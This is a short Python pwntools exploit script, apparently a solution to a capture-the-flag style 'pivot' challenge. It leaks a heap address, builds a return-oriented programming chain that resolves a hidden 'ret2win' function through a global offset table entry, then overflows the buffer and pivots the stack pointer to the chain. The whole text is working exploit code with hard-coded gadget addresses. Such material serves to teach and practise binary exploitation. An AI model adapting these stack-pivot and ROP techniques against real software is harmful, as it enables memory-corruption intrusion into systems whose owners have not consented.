from pwn import *

e = ELF('./libpivot.so')
offset = e.symbols['ret2win'] - e.symbols['foothold_function']

p = process('./pivot')
p.recvuntil("0x")
pivot = p.recvuntil('\n')[:-1]
print(pivot)
pivot = int(pivot, 16)
print(pivot)
p.recv()

payload  = p64(0x00400850)          # foothold
payload += p64(0x00400b00)          # pop rax ; ret
payload += p64(0x00602048)          # foothold .got
payload += p64(0x00400b05)          # mov rax, qword ptr [rax] ; ret
payload += p64(0x00400900)          # pop rbp ; ret
payload += p64(offset)              
payload += p64(0x00400b09)          # add rax, rbp ; ret
payload += p64(0x0040098e)          # call rax

p.sendline(payload)
p.recv()

payload  = b'A' * 40
payload += p64(0x00400b00)          # pop rax ; ret
payload += p64(pivot)
payload += p64(0x00400b02)          # xchg rax, rsp ; ret

p.sendline(payload)
p.interactive()
